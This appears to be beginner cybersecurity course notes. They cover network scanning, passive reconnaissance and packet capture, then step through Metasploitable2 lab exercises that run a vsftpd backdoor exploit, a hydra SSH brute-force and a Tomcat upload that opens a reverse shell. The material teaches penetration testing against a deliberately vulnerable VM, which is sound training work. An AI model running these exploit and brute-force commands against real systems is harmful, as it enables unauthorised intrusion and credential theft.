 Theory Recap 
Key Concepts:
* IP Address: Unique identifier for a device on a network
* Ports: Logical endpoints (e.g., port 80 = HTTP)
* Protocols:
o TCP – reliable, connection-based (uses 3-way handshake)
o UDP – faster, no handshake
* 3-Way Handshake (TCP):

1. SYN ?  2. SYN-ACK ? 3. A
??? 1. Nmap for Network Scanning
?? Goal: Discover live hosts, open ports, and services.
Install Nmap
bash
CopyEdit
sudo apt update
sudo apt install nmap
Basic Commands:
* Ping scan (check which hosts are up):
bash
CopyEdit
nmap -sn 192.168.1.0/24
* Scan specific host with default options:
nmap 192.168.1.10
* Scan for specific ports:
nmap -p 22,80,443 192.168.1.10
* Service version detection:
nmap -sV 192.168.1.10
* Aggressive scan (OS + version detection):
nmap -A 192.168.1.10
Use man nmap to learn more options.

 2. Passive Recon with whois, nslookup, theHarvester
 Goal: Gather info about domains without touching the target server directly.
whois
bash
CopyEdit
whois example.com
 Output: Owner, registrar, contact details.

nslookup
nslookup example.com
 Output: IP addresses and DNS records.

theHarvester
Install:
sudo apt install theharvester
 Example:
theharvester -d example.com -l 100 -b bing
Finds emails, hosts, and subdomains from public sources.

 3. Packet Capture with Wireshark
 Goal: Observe live network traffic
Open Wireshark
sudo wireshark
Steps:
1. Select your network interface (e.g., eth0, wlan0)
2. Click Start Capture
3. Visit a website in browser
4. Stop capture
 Use filter: http or tcp.port == 80
 Right-click ? Follow TCP stream ? See entire conversation

4. tcpdump for CLI packet capture
Goal: CLI-based packet capture and analysis
Basic Capture:
sudo tcpdump -i eth0
Filter HTTP traffic:
sudo tcpdump -i eth0 port 80
Save to file for Wireshark:
sudo tcpdump -i eth0 -w output.pcap
?? Open output.pcap in Wireshark later:
wireshark output.pcap


 Cybersecurity Lab Exercises – Metasploitable2 using Metasploit

This repository contains beginner-friendly hands-on **penetration testing exercises** using **Kali Linux**, **Metasploitable2**, and the **Metasploit Framework**. These labs help students learn how vulnerabilities are exploited in real-world scenarios.

---

## Lab Setup Requirements

Kali Linux (attacker machine)
Metasploitable2 (vulnerable target machine)
Same VirtualBox/VMware network (Host-Only or NAT)
Tools Used: `msfconsole`, `nmap`, `hydra`, `gobuster`, `telnet`, `netdiscover`, `dvwa`


##  Lab Exercises

###  Exercise 1: Discover Target Machine (Network Scanning)
netdiscover -r 192.168.56.0/24
Goal: Identify the IP address of the Metasploitable2 machine.

Exercise 2: Scan Open Ports and Services
nmap -sS -sV <TARGET_IP>
Goal: Find open ports and detect service versions.

Exercise 3: Exploit FTP (vsftpd 2.3.4)
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <TARGET_IP>
run
Goal: Get a remote shell via vulnerable FTP server.

Exercise 4: Web Directory Enumeration
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
Goal: Discover hidden web folders like /phpmyadmin/, /dvwa/.

Exercise 5: SSH Brute-force Attack
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
Goal: Crack the SSH login password using brute-force.

Exercise 6: Exploit Tomcat Manager
use exploit/multi/http/tomcat_mgr_upload
set RHOST <TARGET_IP>
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST <KALI_IP>
run
Goal: Upload reverse shell via Tomcat and gain access.
